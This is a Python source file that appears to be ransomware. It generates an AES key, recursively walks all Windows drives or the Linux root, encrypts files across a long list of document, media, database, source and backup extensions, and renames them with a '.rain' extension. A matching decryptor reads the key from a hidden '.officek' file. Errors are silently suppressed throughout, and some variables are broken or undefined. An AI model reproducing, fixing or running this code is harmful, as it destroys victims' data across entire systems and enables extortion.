from Crypto.Cipher import AES
from Crypto import Random
import os
from shutil import copyfile
import platform
import glob
import sys
import string
from sys import exit

BLOCK_SIZE = 32
k = Random.new().read(BLOCK_SIZE)
aes = AES.new(k, AES.MODE_ECB)
drives = list(string.ascii_uppercase)
mc = platform.system()
file = ''
documents = os.path.expanduser('~/Documents')

ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.png','*.bitmap'
,'*.mp4','*.avi','*.zip','*.wav','*.svg','*.mdb','*.rar','*.tar','*.xf','*.gz'
,'*.sqlite3','*.mov','*.pptx','*.pptm','*.xlsx','*.xlsm','*.aes','*.accdb','*.bmp'
,'*.mpeg','*.sql','*.sqlitedb','*.jar','*.java','*.cdr','*.vssettings','*.vbs','*.vssx'
,'*.cpp','*.c','*.NET','*.rb','*.sh','*.appref-ms','*.html','*.css','*.sublime-package'
,'*.bz2','*.iso','*.img','*.sfk','*.mkv','*.psd','*.xz','*.7z','*.gz','*.mid','*.wmv','*.mov'
,'*.cdr','*.ai','*.tif','*.fla','*.swf','*.dwg','*.mpg','*.xls','*.docx','*.rtf','*.pps','*.ppt'
,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new'
,'*.bkp','*.bak','*.tmp','*.gho','*.mp3','*.pyd','*.pyc']

class Crypt:
	def crypt(file):
		file_crypto = open(file,'rb')
		file_crypto = file_crypto.read()
		correct = file_crypto+b'#'*(16-len(file_crypto)%16)
		cifdata = aes.encrypt(correct)
		cifile = open(file,'wb')
		cifile.write((os.path.splitext(file)[1].strip('.')+'.').encode()+cifdata)
		cifile.close()
		ne = os.path.splitext(file)[0]
		os.rename(file,ne+".rain")

	def cryptingcommon(dirct):
		try:
			os.chdir(dirct)
			for i in ext:
				try:
					files = glob.iglob(dirct+'/**/'+(i),recursive=True)
				except:
					pass
				for file in files:
					try:
						Crypt.crypt(file)
					except:
						pass
		except:
			pass

	def infectall():
		if mc=='Windows':
			for i in drives:
				try:
					i = i+':/'
					os.chdir(i)
					for e in ext:
						try:
							files = glob.iglob(i+'/**/'+(e),recursive=True)
						except:
							pass
						for file in files:
							try:
								Crypt.crypt(file)
							except:
								pass
				except:
					pass
		elif mc=='Linux':
			try:
				os.chdir('/')
				for e in ext:
					try:
						files = glob.iglob(i+'/**/'+(e),recursive=True)
					except:
						pass
					for file in files:
						try:
							Crypt.crypt(file)
						except:
							pass
			except:
				pass
				
	def resource_path(relative_path):
    		if hasattr(sys, '_MEIPASS'):
        		return os.path.join(sys._MEIPASS, relative_path)
    		return os.path.join(os.path.abspath("."), relative_path)


class Decrypt:
	def correctext(filex):
		global file
		cnt = 0
		char = []
		while True:
			file_ext = open(filex,'rb')
			file_ext.seek(cnt)
			c = file_ext.read(1)
			if c!=b'.':
				char.append(c)
				cnt=cnt+1
				continue
			else:
				file_ext.close()
				ext = [x.decode('utf-8') for x in char]
				ext = ''.join(ext)
				os.rename(filex,os.path.splitext(filex)[0]+'.'+ext)
				file = os.path.splitext(filex)[0]+'.'+ext
				file_rem = open(file,'rb')
				cnt=cnt+1
				file_rem.seek(cnt)
				s = file_rem.read()
				file_rem.close()
				file_rem = open(file,'wb')
				file_rem.write(s)
				file_rem.close()
				break

	def decrypt(filed):
		global file
		Decrypt.correctext(filed)
		filed=file
		file_decrypto = open(filed,'rb')
		correct = file_decrypto.read().strip(b'#')
		decifdata = aes.decrypt(correct)
		file_decrypto.close()
		decifile = open(filed,'wb')
		decifile.write(decifdata)
		decifile.close()
		decifile = open(filed,'rb')
		s = decifile.read().strip(b'#')
		decifile.close()
		decifile = open(filed,'wb')
		decifile.write(s)
		decifile.close()

	def decryptingcommon(dirct):
		try:
			os.chdir(dirct)
			for i in ext:
				try:
					files = glob.iglob(dirct+'/**/'+(i),recursive=True)
				except:
					pass
				for file in files:
					try:
						Decrypt.decrypt(file)
					except:
						pass
		except:
			pass

	def getkey():
		global k
		if mc=='Windows':
			try:
				ke = open(documents+'/.officek','rb')
				k = ke.read()
				ke.close()
			except:
				exit()
		elif mc=='Linux':
			try:
				ke = open(documents+'/.officek','rb')
				k = ke.read()
				ke.close()
			except:
				pass
			try:
				ke = open(documentos+'/.officek','rb')
				k = ke.read()
				ke.close()
			except:
				exit()

	def cureall():
		if mc=='Windows':
			for i in drives:
				try:
					i = i+':/'
					os.chdir(i)
					try:
						files = glob.iglob(i+'/**/'+'*.rain',recursive=True)
					except:
						pass
					for file in files:
						try:
							Decrypt.decrypt(file)
						except:
							pass
				except:
					pass
		elif mc=='Linux':
			try:
				os.chdir('/')
				try:
					files = glob.iglob(i+'/**/'+'*.rain',recursive=True)
				except:
					pass
				for file in files:
					try:
						Decrypt.decrypt(file)
					except:
						pass
			except:
				pass